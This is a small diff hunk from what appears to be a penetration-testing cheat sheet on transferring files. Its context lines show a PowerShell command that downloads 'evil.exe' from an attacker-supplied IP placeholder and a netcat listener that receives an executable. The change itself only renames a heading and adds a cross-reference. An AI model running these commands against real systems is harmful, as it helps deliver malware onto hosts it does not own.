@@ -9,7 +9,9 @@ Powershell
 	powershell (new-object System.Net.WebClient).DownloadFile('http://[your_ip_address]/evil.exe','evil.exe')
 
 
-Netcat
+A link-  :ref:`Netcat`
+
+Netcat2
 ----------
 
 - Server: nc –nlvp <port> &gt; incoming.exe
